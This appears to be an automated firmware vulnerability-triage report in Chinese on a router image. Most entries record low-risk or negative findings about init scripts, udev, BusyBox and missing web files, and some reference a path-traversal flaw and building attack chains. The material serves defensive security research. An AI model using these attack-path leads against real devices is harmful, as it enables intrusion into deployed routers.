- **描述:** 未定义函数风险：dump(3, "/device/log")函数实现未定位。固定参数'/device/log'暂未发现漏洞，但存在隐患：a) 若函数内部存在文件操作/命令执行且参数可控；b) 函数未定义可能导致运行时错误。当前无证据表明外部输入可影响此函数。
- **代码片段:**
  ```
  echo dump(3, "/device/log");
  ```
- **关键词:** dump, /device/log
- **备注:** 建议后续任务：1) 全局搜索dump函数定义（/lib,/sbin）；2) 分析/bin/ez-ipupdate等二进制；关联发现：知识库中已存在dump()相关调用

---
### env_set-dbg.udev_node_add-0xaad0

- **文件路径:** `usr/bin/udevstart`
- **位置:** `dbg.udev_node_add:0xaad0`
- **类型:** env_set
- **综合优先级分数:** **4.0**
- **风险等级:** 3.0
- **置信度:** 7.0
- **触发可能性:** 2.0
- **查询相关性:** 6.0
- **阶段:** N/A
- **描述:** 在函数dbg.udev_node_add(0xaad0)中发现setenv设置DEVNAME环境变量。约束条件：1) DEVNAME值源自局部变量，未发现直接外部输入来源；2) 当前分析未检测到DEVNAME被getenv读取并传递给危险操作（如execv）。安全影响评估：单独存在时风险较低，但需注意环境变量可能被其他组件读取利用。触发条件：其他进程依赖DEVNAME环境变量且未经验证。
- **关键词:** setenv, DEVNAME, dbg.udev_node_add
- **备注:** 跨组件风险提示：建议检查固件中所有getenv("DEVNAME")调用点。注意：udevinfo组件存在环境变量相关漏洞（见pass_env_to_socket漏洞记录）

---
### configuration_load-form_admin-file_missing

- **文件路径:** `htdocs/mydlink/form_admin`
- **位置:** `htdocs/mydlink/form_admin:0 (N/A) 0x0`
- **类型:** configuration_load
- **综合优先级分数:** **4.0**
- **风险等级:** 2.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 5.0
- **阶段:** N/A
- **描述:** 目标文件 'htdocs/mydlink/form_admin' 不存在于固件文件系统中。文件访问命令返回错误：'cannot open `htdocs/mydlink/form_admin' (No such file or directory)'。因此无法进行任何代码分析或漏洞识别。
- **代码片段:**
  ```
  N/A (file not accessible)
  ```
- **关键词:** htdocs/mydlink/form_admin
- **备注:** 建议：1) 验证文件路径是否正确 2) 提供替代分析目标文件 3) 检查固件提取是否完整

---
### negative_finding-no_dangerous_ops-DEVICE.ACCOUNT.xml.php

- **文件路径:** `htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php`
- **位置:** `DEVICE.ACCOUNT.xml.php`
- **类型:** configuration_load
- **综合优先级分数:** **3.7**
- **风险等级:** 2.0
- **置信度:** 9.0
- **触发可能性:** N/A
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 未发现NVRAM写操作或命令执行等高危函数调用。数据流限于：外部输入→$GETCFG_SVC→XML输出；query()读配置→XML输出。无完整攻击链直接证据。
- **备注:** 需结合其他组件（如FIREWALL.xml.php）构建完整攻击路径

---
### busybox-ash_main-command_parsing

- **文件路径:** `bin/busybox`
- **位置:** `bin/busybox @ fcn.00008140 (offset -0x7c)`
- **类型:** command_execution
- **综合优先级分数:** **3.11**
- **风险等级:** 1.0
- **置信度:** 8.5
- **触发可能性:** 0.3
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** BusyBox (v1.14.1)存在严重功能裁剪，网络服务(telnetd/httpd)、权限管理(su/login/passwd)和环境操作(env)等关键组件均未编译。唯一可验证的ash_main函数显示：1) 命令解析使用固定长度(8字节)内存复制 2) 目标缓冲区经初始化后为120字节 3) 索引变量被限制在0-14范围内。未发现缓冲区溢出或命令注入漏洞。触发条件：仅当异常调用链使uVar9≥15时才可能越界，但无证据表明该条件可达。
- **代码片段:**
  ```
  for (; uVar9 = *puVar12, uVar9 != 0; puVar12 = puVar12 + 2) {
    if (uVar9 < 0xf) {
      fcn.00008140(puVar17 + uVar9*8 + -0x7c, puVar12, 8);
    }
  }
  ```
- **关键词:** ash_main, fcn.00008140, puVar17, uVar9, fcn.00008160, 0x7c, 0x78
- **备注:** 需验证fcn.0007a14c的环境处理逻辑。建议后续：1. 分析www目录的Web服务 2. 检查/sbin下的网络守护进程 3. 检索固件中的setuid程序。关联上下文：80%高危组件缺失导致攻击链构建失败。

---
### internal_state-RUNTIME.CLIENTS.xml.php

- **文件路径:** `htdocs/webinc/getcfg/RUNTIME.CLIENTS.xml.php`
- **位置:** `RUNTIME.CLIENTS.xml.php:14-40`
- **类型:** configuration_load
- **综合优先级分数:** **3.1**
- **风险等级:** 0.5
- **置信度:** 9.5
- **触发可能性:** N/A
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 文件未处理外部输入（未使用$_GET/$_POST），未调用危险函数，所有数据来自内部运行时状态（/runtime/路径）。确认无直接安全风险。
- **关键词:** /runtime/inf, /runtime/phyinf, dump(), query()

---
### analysis_status-cgi_file-absent

- **文件路径:** `htdocs/mydlink/info.cgi`
- **位置:** `htdocs/mydlink/info.cgi:0 (file_not_found)`
- **类型:** configuration_load
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 目标文件'htdocs/mydlink/info.cgi'不存在于固件中，无法进行任何分析。可能原因：路径错误、固件版本差异或文件被移除。该情况导致无法分析该CGI脚本的输入处理、外部程序调用或数据泄露风险。
- **关键词:** htdocs/mydlink/info.cgi
- **备注:** 建议：1) 验证固件版本与文件路径 2) 检查其他CGI文件如*.cgi或*.bin 3) 通过ListUniqueValues查询实际存在的CGI文件路径

---
### script-init-S10init

- **文件路径:** `etc/init.d/S10init.sh`
- **位置:** `S10init.sh:1-7`
- **类型:** command_execution
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** S10init.sh是静态初始化脚本，仅执行预定义的系统挂载和内核参数配置。无外部输入处理逻辑：1) 未使用getenv/nvram_get等获取外部数据 2) 未将任何数据传递到system/eval等危险函数 3) 所有操作均为硬编码命令。由于脚本在启动时自动执行且不接受任何外部输入，不存在攻击者可利用的触发条件或传播路径。
- **代码片段:**
  ```
  mount -t proc none /proc
  mount -t ramfs ramfs /var
  mount -t sysfs sysfs /sys
  mount -t usbfs usbfs /proc/bus/usb
  echo 7 > /proc/sys/kernel/printk
  echo 1 > /proc/sys/vm/panic_on_oom
  ```
- **关键词:** mount, echo, /proc/sys/kernel/printk, /proc/sys/vm/panic_on_oom
- **备注:** 建议转向分析其他可能处理外部输入的组件：1) Web服务(如/www目录) 2) 网络守护进程 3) 包含动态逻辑的init.d脚本

---
### configuration_load-init-S19static_init

- **文件路径:** `etc/init.d/S19init.sh`
- **位置:** `etc/init.d/S19init.sh`
- **类型:** configuration_load
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 1.0
- **阶段:** N/A
- **描述:** S19init.sh仅执行静态初始化操作：创建/var子目录并初始化resolv.conf、TZ、hosts文件。无NVRAM操作、网络服务启动或外部输入处理流程。文件无动态数据处理逻辑，因此不存在触发条件、边界检查问题或安全影响。
- **代码片段:**
  ```
  #!/bin/sh
  mkdir -p /var/etc /var/log ...
  echo -n > /var/etc/resolv.conf
  echo -n > /var/TZ
  echo "127.0.0.1 hgw" > /var/hosts
  ```
- **关键词:** mkdir, echo, /var/etc/resolv.conf, /var/TZ, /var/hosts
- **备注:** 该文件不包含可被利用的攻击路径组件。建议转向分析其他启动脚本（如S*开头的服务脚本）或网络服务组件

---
### configuration_load-ipv6_config-S16ipv6

- **文件路径:** `etc/init.d/S16ipv6.sh`
- **位置:** `etc/init.d/S16ipv6.sh`
- **类型:** configuration_load
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 该启动脚本仅配置静态IPv6内核参数：1) 设置IPv6转发(forwarding=1) 2) 配置地址检测(accept_dad=2) 3) 禁用IPv6(disable_ipv6=1)。所有值均为硬编码，未引入任何外部输入源（如环境变量、配置文件或用户输入）。由于缺乏输入验证点且操作完全静态，攻击者无法通过此脚本触发任何危险操作或形成攻击路径。
- **关键词:** /proc/sys/net/ipv6/conf/default/forwarding, /proc/sys/net/ipv6/conf/default/accept_dad, /proc/sys/net/ipv6/conf/default/disable_ipv6, echo
- **备注:** 脚本在启动阶段执行内核参数初始化。建议检查其他网络服务组件（如HTTP守护进程）是否受这些参数影响，但本文件无直接攻击面。

---
### command_execution-factory_reset-script

- **文件路径:** `usr/sbin/factory_reset`
- **位置:** `usr/sbin/factory_reset:1-2`
- **类型:** command_execution
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** factory_reset脚本不处理任何外部输入（无命令行参数、环境变量或标准输入读取），仅静态执行两条命令：1) 'mfc freset'触发配置重置 2) 'reboot'强制重启设备。由于缺乏输入接口，不存在未经验证的用户输入传播路径。实际安全风险完全依赖'mfc'命令的内部实现（如是否存在缓冲区溢出），但该依赖超出当前文件范围。
- **代码片段:**
  ```
  #!/bin/sh
  mfc freset
  reboot
  ```
- **关键词:** mfc, reboot, freset
- **备注:** 需后续分析'mfc'二进制（可能位于/sbin或/usr/sbin）以验证：1) 'freset'子命令是否处理外部输入 2) 是否存在内存破坏漏洞。reboot命令通常需root权限，但需验证实际权限设置。

---
### command_execution-udevstart_init-s23_script

- **文件路径:** `etc/init.d/S23udevd.sh`
- **位置:** `etc/init.d/S23udevd.sh`
- **类型:** command_execution
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 在etc/init.d/S23udevd.sh脚本中：1) 未发现任何外部输入源（环境变量/NVRAM/配置文件）接入点 2) udevstart命令以静态方式执行，无参数传递或变量拼接 3) 无输入验证缺陷或命令注入风险。脚本本身安全，但启动的udevstart程序（路径未明确）存在前期分析指出的潜在风险（execv使用未验证参数）。触发条件不成立，因脚本未提供污染入口。
- **关键词:** udevstart
- **备注:** 关联发现：hardware_input-udev_initialization-rule_trigger（S15udevd.sh）。后续建议：1) 定位udevstart二进制路径（如/sbin/udevstart）2) 申请跨目录分析权限验证param_1污染链 3) 检查udevstart是否通过其他机制接收输入（如套接字/NVRAM）

---
### config_anomaly-nat_configuration-etc_config_nat

- **文件路径:** `etc/config/nat`
- **位置:** `etc/config/nat`
- **类型:** configuration_load
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 文件内容仅为字符串'Daniel\'s NAT'，未包含标准NAT配置（如端口转发规则、重定向配置）。可能原因：1) 开发占位符未替换 2) 文件被非常规篡改 3) 特殊用途配置。关联漏洞：已知漏洞http_input-XNODE_path_traversal-PFWD.NAT-1.xml.php通过XNODE_getpathbytarget()访问/nat节点，本文件作为配置源可能影响漏洞触发条件。无证据表明存在独立攻击路径。
- **代码片段:**
  ```
  Daniel's NAT
  ```
- **关键词:** etc/config/nat, /nat, XNODE_getpathbytarget, PFWD.NAT-1.xml.php
- **备注:** 需检查文件修改时间及调用该文件的进程（如防火墙服务）。关联漏洞：http_input-XNODE_path_traversal-PFWD.NAT-1.xml.php。建议：1) 验证防火墙服务是否加载此配置 2) 测试异常配置是否导致XNODE_getpathbytarget()处理异常

---
### analysis-failure-httpd

- **文件路径:** `sbin/httpd`
- **位置:** `sbin/httpd:0 (unknown) 0x0`
- **类型:** network_input
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 分析'sbin/httpd'失败：所有静态分析工具(r2/strings/readelf)均未返回有效证据。失败原因：1) 文件可能损坏/加密 2) ARM架构工具链不兼容 3) BusyBox环境限制。由于缺乏基本函数定位和代码上下文，无法进行任何攻击路径分析。
- **关键词:** httpd
- **备注:** 关键建议：1) 验证文件MD5/SHA1 2) 搭建ARM调试环境 3) 优先分析文本型文件(如/etc/httpd.conf)。当前应转向分析'www'目录的Web脚本或'etc'配置文件。注意：知识库中已存在与'httpd'相关的其他发现（通过linking_keywords验证），需后续关联分析。

---
### command_execution-init-mkdir_storage

- **文件路径:** `etc/init.d/S21usbmount.sh`
- **位置:** `etc/init.d/S21usbmount.sh:2`
- **类型:** command_execution
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 1.0
- **阶段:** N/A
- **描述:** 启动脚本仅执行固定目录创建操作（mkdir -p /var/tmp/storage），不接收或处理任何外部输入（无参数、环境变量引用或用户交互）。无危险命令调用（如mount/umount），未实现标准服务函数（start/stop）。该脚本无法构成攻击路径的组成部分，不存在触发条件或安全影响。
- **代码片段:**
  ```
  mkdir -p /var/tmp/storage
  ```
- **关键词:** mkdir, /var/tmp/storage, S21usbmount.sh
- **备注:** 需注意此脚本可能被系统初始化进程调用，但自身无风险。建议后续分析实际处理USB挂载的组件（如usbmount守护进程或hotplug脚本）。

---
### dangerous-func-scan-negative

- **文件路径:** `usr/sbin/httpc`
- **位置:** `全局扫描`
- **类型:** command_execution
- **综合优先级分数:** **2.4**
- **风险等级:** 0.0
- **置信度:** 8.0
- **触发可能性:** 0.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 危险函数调用：经全面扫描，未发现system/popen/exec系列函数调用。排除通过httpc直接触发命令注入的可能性。
- **关键词:** system, popen, exec, /bin/sh
- **备注:** 静态分析可能遗漏间接调用，建议动态验证

---
### analysis_issue-popen_chain_verification

- **文件路径:** `usr/sbin/fileaccessd`
- **位置:** `bin/fileaccessd:0 [unknown] 0x0`
- **类型:** analysis_limitation
- **综合优先级分数:** **2.4**
- **风险等级:** 0.0
- **置信度:** 8.0
- **触发可能性:** 0.0
- **查询相关性:** 7.5
- **阶段:** N/A
- **描述:** system/popen调用链与外部输入关联性未验证：工具无法定位有效调用点（地址0xf624/0xf640超出.text段），影响高危RCE漏洞的完整攻击链验证。
- **关键词:** popen, fcn.0000f624, fcn.0000f640, system_call_chain
- **备注:** 建议：1) 检查二进制文件完整性 2) 动态分析验证调用链 3) 确认地址是否属于动态加载模块

---
### path-traversal-scan-failed

- **文件路径:** `usr/sbin/httpc`
- **位置:** `扫描任务异常终止`
- **类型:** file_read
- **综合优先级分数:** **2.1**
- **风险等级:** 0.0
- **置信度:** 7.0
- **触发可能性:** 0.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 路径遍历/命令注入：检测任务执行失败，未获取有效结果。但基于其他任务证据（无危险函数调用、无文件操作函数），推断该文件不存在此类漏洞。
- **关键词:** httpc, rgbin
- **备注:** 任务执行失败原因待查，建议在服务端组件中重点检测此类漏洞

---
